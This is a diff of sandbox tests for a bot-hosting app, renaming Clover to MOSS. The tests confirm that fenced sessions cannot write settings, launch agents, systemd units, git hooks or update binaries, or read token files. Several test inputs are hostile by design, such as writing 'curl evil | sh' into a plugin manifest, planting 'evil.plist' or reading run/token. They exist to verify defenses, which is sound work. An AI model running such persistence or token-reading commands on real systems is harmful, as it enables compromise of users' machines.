+    const loadDenies = policy.denyWrite.filter((d) => d.endsWith("/node_modules") && !d.startsWith(`${moss}/`));
     expect(loadDenies).toContain(join(home, "node_modules"));
-    const base = { policy, cloverHome: clover, cwd: join(home, "project"), uid: 1 };
+    const base = { policy, mossHome: moss, cwd: join(home, "project"), uid: 1 };
     // Without supervising it the home is held (the CI failure the review round met); supervised, it isn't.
     expect(bwrapPlan(base).held.map((h) => h.folder)).toContain(home);
     expect(bwrapPlan({ ...base, supervised: loadDenies }).held.map((h) => h.because)).not.toContain(join(home, "node_modules"));
   });
 
   test("supervised files are never held for: the supervisor refuses them instead", () => {
-    const dirs = new Set(["/h", "/h/.clover", "/t"]);
+    const dirs = new Set(["/h", "/h/.moss", "/t"]);
     const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
-    const { held, args } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs,
-      supervised: ["/h/.zshrc", "/h/.bash_profile", "/h/.config/systemd/user/clover-core.service"],
+    const { held, args } = bwrapPlan({ mossHome: "/h/.moss", cwd: "/h", uid: 1, fs,
+      supervised: ["/h/.zshrc", "/h/.bash_profile", "/h/.config/systemd/user/moss-core.service"],
       policy: {
-        allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.bash_profile", "/h/.clover/settings.json"],
+        allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.bash_profile", "/h/.moss/settings.json"],
         denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
     // The supervised ones never hold, and the existing safe file needs no holding either: nothing is held.
     expect(held).toEqual([]);
     expect(args.join(" ")).toContain("--bind /h /h");
     expect(args.join(" ")).not.toContain("--ro-bind /h /h");
     // Without the supervisor list the same missing file would hold the whole home.
-    const { held: heldWithout } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
+    const { held: heldWithout } = bwrapPlan({ mossHome: "/h/.moss", cwd: "/h", uid: 1, fs, policy: {
       allowWrite: ["/h", "/t"], denyWrite: ["/h/.zshrc"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
     expect(heldWithout).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
   });
@@ -909,10 +909,10 @@ describe("the session's own repo", () => {
 
 describe("a folder held for a fenced file that isn't there yet (accepted for now, the controller's ruling)", () => {
   test("the plan names it, and a read-only refusal there is explained: which file, a subfolder, or ask the user", () => {
-    const dirs = new Set(["/h", "/h/.clover", "/t"]);
+    const dirs = new Set(["/h", "/h/.moss", "/t"]);
     const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
-    const { held } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
-      allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.clover/settings.json"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
+    const { held } = bwrapPlan({ mossHome: "/h/.moss", cwd: "/h", uid: 1, fs, policy: {
+      allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.moss/settings.json"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
     expect(held).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
     const note = heldFolderNote("sh: 1: cannot create /h/new.txt: Read-only file system\n", held)!;
     expect(note).toContain("/h takes no new names under the fence, because /h/.zshrc is fenced");
@@ -935,24 +935,24 @@ describe("the Linux seccomp filter", () => {
 });
 
 describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the real sandbox`, () => {
-  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else in the Clover home", async () => {
+  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else in the MOSS home", async () => {
     const w = world();
     for (const target of ["settings.json", "SETTINGS.json", "ſettings.json", "settings/new.json", "plugins-state/oks/x.json", "PLUGINS-STATE/OKS/y.json"]) {
-      expect(ok(await w.run(`echo x > '${join(w.clover, target)}'`))).toBe(false);
+      expect(ok(await w.run(`echo x > '${join(w.moss, target)}'`))).toBe(false);
     }
-    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
+    expect(readFileSync(join(w.moss, "settings.json"), "utf8")).toBe("orig");
     // Home and temp are writable.
     expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}'`))).toBe(true);
-    // Nothing else in the Clover home is reachable (default-deny).
-    expect(ok(await w.run(`echo x > '${join(w.clover, "scratch", "c.txt")}'`))).toBe(false);
+    // Nothing else in the MOSS home is reachable (default-deny).
+    expect(ok(await w.run(`echo x > '${join(w.moss, "scratch", "c.txt")}'`))).toBe(false);
     // The plugins folder and the login-start place, ahead of and in the contract: a launch agent.
-    mkdirSync(join(w.clover, "plugins", "tarot"), { recursive: true });
-    for (const target of [join(w.clover, "plugins", "tarot", "clover.json")]) {
+    mkdirSync(join(w.moss, "plugins", "tarot"), { recursive: true });
+    for (const target of [join(w.moss, "plugins", "tarot", "moss.json")]) {
       expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
     }
     if (here === "macos") {
-      // Clover's own login item, a new launch agent, and the shell startup files: a bot's session plants none.
-      expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.clover.core.plist")}'`))).toBe(false);
+      // MOSS's own login item, a new launch agent, and the shell startup files: a bot's session plants none.
+      expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.moss.core.plist")}'`))).toBe(false);
       mkdirSync(join(w.home, "Library", "LaunchAgents"), { recursive: true });
       expect(ok(await w.run(`echo x > '${join(w.home, "Library", "LaunchAgents", "evil.plist")}'`))).toBe(false);
       expect(existsSync(join(w.home, "Library", "LaunchAgents", "evil.plist"))).toBe(false);
@@ -995,15 +995,15 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
       mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
       expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
       expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
-      // Lane M's self-update files under the Clover home: the daemon binary, a staged boot record and the
-      // install record are refused (the Clover home default-deny backs the kind).
-      for (const f of [join(w.clover, "bin", "clover-core"), join(w.clover, "update", "boot.json"), join(w.clover, "install.json")]) {
+      // Lane M's self-update files under the MOSS home: the daemon binary, a staged boot record and the
+      // install record are refused (the MOSS home default-deny backs the kind).
+      for (const f of [join(w.moss, "bin", "moss-core"), join(w.moss, "update", "boot.json"), join(w.moss, "install.json")]) {
         expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
       }
-      expect(existsSync(join(w.clover, "install.json"))).toBe(false); // never created, never planted
+      expect(existsSync(join(w.moss, "install.json"))).toBe(false); // never created, never planted
     } else {
       // The systemd user unit, an autostart entry, and the shell startup files: a bot's session plants none.
-      expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "clover-core.service")}'`))).toBe(false);
+      expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "moss-core.service")}'`))).toBe(false);
       mkdirSync(join(w.home, ".config", "autostart"), { recursive: true });
       expect(ok(await w.run(`echo x > '${join(w.home, ".config", "autostart", "evil.desktop")}'`))).toBe(false);
       mkdirSync(join(w.home, ".config", "autostart-scripts"), { recursive: true });
@@ -1040,48 +1040,48 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
       mkdirSync(join(w.home, "project", ".git", "hooks"), { recursive: true });
       expect(ok(await w.run(`echo x > '${join(w.home, "project", ".git", "hooks", "post-checkout")}'`))).toBe(false);
       expect(existsSync(join(w.home, "project", ".git", "hooks", "post-checkout"))).toBe(false);
-      // Lane M's self-update files under the Clover home: the daemon binary and its swap copy, a staged boot
+      // Lane M's self-update files under the MOSS home: the daemon binary and its swap copy, a staged boot
       // record and the install record are refused; the install record is never created and never planted.
-      for (const f of [join(w.clover, "bin", "clover-core"), join(w.clover, "bin", "clover-core.new"),
-        join(w.clover, "update", "boot.json"), join(w.clover, "install.json")]) {
+      for (const f of [join(w.moss, "bin", "moss-core"), join(w.moss, "bin", "moss-core.new"),
+        join(w.moss, "update", "boot.json"), join(w.moss, "install.json")]) {
         expect(ok(await w.run(`echo x > '${f}'`))).toBe(false);
       }
-      expect(existsSync(join(w.clover, "install.json"))).toBe(false);
+      expect(existsSync(join(w.moss, "install.json"))).toBe(false);
     }
     // A fenced file that isn't there yet can't be made either.
-    expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
-    expect(existsSync(join(w.clover, "trust.json"))).toBe(false);
+    expect(ok(await w.run(`echo '{}' > '${join(w.moss, "trust.json")}'`))).toBe(false);
+    expect(existsSync(join(w.moss, "trust.json"))).toBe(false);
     expect(ok(await w.run(`echo x > '${join(w.outside, "c.txt")}'`))).toBe(false);
   }, 60_000);
 
   test("a bot's own session can write to its own scratch folder", async () => {
     const w = worldBot();
-    const ownScratch = join(w.clover, "scratch", "luna");
+    const ownScratch = join(w.moss, "scratch", "luna");
     mkdirSync(ownScratch, { recursive: true });
     expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}' && echo z > '${join(ownScratch, "c.txt")}'`))).toBe(true);
   }, 60_000);
 
   test("no rename or removal of a folder that holds a fenced item, no hard link from one; a symlink is followed", async () => {
     const w = world();
-    expect(ok(await w.run(`mv '${w.clover}' '${join(w.home, "moved")}'`))).toBe(false);
-    expect(ok(await w.run(`mv '${join(w.clover, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
+    expect(ok(await w.run(`mv '${w.moss}' '${join(w.home, "moved")}'`))).toBe(false);
+    expect(ok(await w.run(`mv '${join(w.moss, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
     // `rm -rf` can't even list the home's denied folders, so it exits 0 deleting nothing: the state is the assertion.
-    await w.run(`rm -rf '${w.clover}'`);
-    expect(existsSync(join(w.clover, "settings.json"))).toBe(true);
-    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
-    expect(ok(await w.run(`ln '${join(w.clover, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
-    expect(ok(await w.run(`ln -s '${join(w.clover, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
-    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
+    await w.run(`rm -rf '${w.moss}'`);
+    expect(existsSync(join(w.moss, "settings.json"))).toBe(true);
+    expect(readFileSync(join(w.moss, "settings.json"), "utf8")).toBe("orig");
+    expect(ok(await w.run(`ln '${join(w.moss, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
+    expect(ok(await w.run(`ln -s '${join(w.moss, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
+    expect(readFileSync(join(w.moss, "settings.json"), "utf8")).toBe("orig");
   }, 60_000);
 
-  test("the run folder can't be read; non-ASCII names where Clover names things can't be made; the closed doors and the network are shut", async () => {
+  test("the run folder can't be read; non-ASCII names where MOSS names things can't be made; the closed doors and the network are shut", async () => {
     const w = world();
-    expect(ok(await w.run(`cat '${join(w.clover, "run", "token")}'`))).toBe(false);
-    // Tool runners cannot read settings.json (Clover home is default-deny; only per-caller allows permit access).
-    expect(ok(await w.run(`cat '${join(w.clover, "settings.json")}'`))).toBe(false);
-    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "öks")}'`))).toBe(false);
-    expect(ok(await w.run(`mkdir '${join(w.clover, "nötes")}'`))).toBe(false);
-    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "new")}'`))).toBe(false); // the home deny refuses every new name in it
+    expect(ok(await w.run(`cat '${join(w.moss, "run", "token")}'`))).toBe(false);
+    // Tool runners cannot read settings.json (MOSS home is default-deny; only per-caller allows permit access).
+    expect(ok(await w.run(`cat '${join(w.moss, "settings.json")}'`))).toBe(false);
+    expect(ok(await w.run(`mkdir '${join(w.moss, "plugins-state", "öks")}'`))).toBe(false);
+    expect(ok(await w.run(`mkdir '${join(w.moss, "nötes")}'`))).toBe(false);
+    expect(ok(await w.run(`mkdir '${join(w.moss, "plugins-state", "new")}'`))).toBe(false); // the home deny refuses every new name in it
     expect(ok(await w.run(`mkdir -p '${join(w.home, "project", "nötes")}'`))).toBe(true); // the user's own names elsewhere
     if (here === "macos") {
       expect(ok(await w.run("/usr/bin/open -g -j /nonexistent-lane-c"))).toBe(false);
@@ -1120,7 +1120,7 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
 
   test("bots' memory for runners: every bot's own conversations read and write any bot's, every other runner is denied, nobody moves it", async () => {
     const w = world();
-    const b = (...p: string[]) => join(w.clover, "bots", ...p);
+    const b = (...p: string[]) => join(w.moss, "bots", ...p);
     for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory")]) mkdirSync(d, { recursive: true });
     writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
     writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
@@ -1256,9 +1256,9 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
 
   test("bots' folders for runners: a bot's own sessions read every bot's folder and the transcripts, writing none; every other runner sees none", async () => {
     const w = world();
-    const b = (...p: string[]) => join(w.clover, "bots", ...p);
-    const store = (...p: string[]) => join(w.clover, "sdk", "projects", ...p);
-    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory"), join(w.clover, "sdk", "projects", "key")]) mkdirSync(d, { recursive: true });
+    const b = (...p: string[]) => join(w.moss, "bots", ...p);
+    const store = (...p: string[]) => join(w.moss, "sdk", "projects", ...p);
+    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory"), join(w.moss, "sdk", "projects", "key")]) mkdirSync(d, { recursive: true });
     writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
     writeFileSync(b("luna", "agents", "t.json"), "{}");
     writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
@@ -1272,16 +1272,16 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
     expect(ok(await w.run(`echo x > '${store("key", "s2.jsonl")}'`, owner))).toBe(false);
     expect(ok(await w.run(`echo x > '${b("sol", "agents.json")}'`, owner))).toBe(false);
     // Any bot's scratch is written too; run/ stays hidden and nothing in the home but those is written.
-    mkdirSync(join(w.clover, "scratch", "sol"), { recursive: true });
-    mkdirSync(join(w.clover, "run"), { recursive: true });
-    writeFileSync(join(w.clover, "run", "app.token"), "tok");
-    expect(ok(await w.run(`echo s > '${join(w.clover, "scratch", "sol", "from-luna.md")}'`, owner))).toBe(true);
-    expect(ok(await w.run(`cat '${join(w.clover, "run", "app.token")}'`, owner))).toBe(false);
-    expect(ok(await w.run(`echo x > '${join(w.clover, "settings.json")}'`, owner))).toBe(false);
+    mkdirSync(join(w.moss, "scratch", "sol"), { recursive: true });
+    mkdirSync(join(w.moss, "run"), { recursive: true });
+    writeFileSync(join(w.moss, "run", "app.token"), "tok");
+    expect(ok(await w.run(`echo s > '${join(w.moss, "scratch", "sol", "from-luna.md")}'`, owner))).toBe(true);
+    expect(ok(await w.run(`cat '${join(w.moss, "run", "app.token")}'`, owner))).toBe(false);
+    expect(ok(await w.run(`echo x > '${join(w.moss, "settings.json")}'`, owner))).toBe(false);
     // The session logs hold the approval grants (A's #350): read, never written, its own or another bot's.
     for (const bot of ["luna", "sol"]) {
-      const log = join(w.clover, "transcripts", bot, `b_${bot}.ndjson`);
-      mkdirSync(join(w.clover, "transcripts", bot), { recursive: true });
+      const log = join(w.moss, "transcripts", bot, `b_${bot}.ndjson`);
+      mkdirSync(join(w.moss, "transcripts", bot), { recursive: true });
       writeFileSync(log, "{}\n");
       expect(ok(await w.run(`cat '${log}'`, owner))).toBe(true);
       expect(ok(await w.run(`echo '{"type":"session_grant"}' >> '${log}'`, owner))).toBe(false);
@@ -1291,10 +1291,10 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
       // The home read-only in place: every bot's folder is there.
       expect(ok(await w.run(`test "$(ls -A '${b()}' | tr '\\n' ' ')" = "luna sol "`, owner))).toBe(true);
       // Its own outputs, scratch and routines read and write there too (made for it on first run).
-      for (const d of [join(w.clover, "outputs", "s1"), join(w.clover, "scratch", "luna")]) mkdirSync(d, { recursive: true });
-      expect(ok(await w.run(`echo o > '${join(w.clover, "outputs", "s1", "r.md")}' && echo s > '${join(w.clover, "scratch", "luna", "n.md")}' && echo r > '${join(w.clover, "routines", "luna", "m.md")}'`, owner))).toBe(true);
+      for (const d of [join(w.moss, "outputs", "s1"), join(w.moss, "scratch", "luna")]) mkdirSync(d, { recursive: true });
+      expect(ok(await w.run(`echo o > '${join(w.moss, "outputs", "s1", "r.md")}' && echo s > '${join(w.moss, "scratch", "luna", "n.md")}' && echo r > '${join(w.moss, "routines", "luna", "m.md")}'`, owner))).toBe(true);
       // Its plugin-data doesn't open for it; another plugin's neither opens for anyone else.
-      expect(ok(await w.run(`echo x > '${join(w.clover, "plugin-data", "tarot", "d.json")}'`, { caller: { kind: "plugin", pluginId: "tarot" } }))).toBe(true);
+      expect(ok(await w.run(`echo x > '${join(w.moss, "plugin-data", "tarot", "d.json")}'`, { caller: { kind: "plugin", pluginId: "tarot" } }))).toBe(true);
     } else {
       expect(ok(await w.run(`ls '${b()}'`, owner))).toBe(true);
     }
@@ -1318,7 +1318,7 @@ describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the
 
   test("git init and clone work without installing hooks", async () => {
     const w = world();
-    // Plain init and clone, as a bot runs them: Clover's empty template installs no hooks.
+    // Plain init and clone, as a bot runs them: MOSS's empty template installs no hooks.
     expect(ok(await w.run(`git init -q . && test ! -e .git/hooks && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x`))).toBe(true);
     expect(existsSync(join(w.home, "project", ".git", "hooks"))).toBe(false);
     mkdirSync(join(w.home, "clone")); // the held home takes no new top-level names: the target exists first
@@ -1334,8 +1334,8 @@ const agent = (bot: string): Caller => ({ kind: "session", sessionId: "a1", sess
 (process.platform === "linux" ? describe : describe.skip)("bubblewrap, live (#392's review)", () => {
   const coding = { kind: "session" as const, sessionId: "c1", sessionKind: "coding" as const };
   const runIn = (home: string) => {
-    for (const d of ["project", "tmp", ".clover"]) mkdirSync(join(home, d), { recursive: true });
-    const spawner = fencedSpawner({ fence: new CloverFence({ os: "linux", home, cloverHome: join(home, ".clover"), temp: join(home, "tmp") }) });
+    for (const d of ["project", "tmp", ".moss"]) mkdirSync(join(home, d), { recursive: true });
+    const spawner = fencedSpawner({ fence: new MossFence({ os: "linux", home, mossHome: join(home, ".moss"), temp: join(home, "tmp") }) });
     return { spawner, run: (command: string) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 30_000, who: { caller: coding } }) };
   };
   const out = (r: Awaited<ReturnType<ReturnType<typeof runIn>["run"]>>) => (r.kind === "exited" ? r.stdout : r.kind === "refused" ? `refused: ${r.reason}` : "timeout");
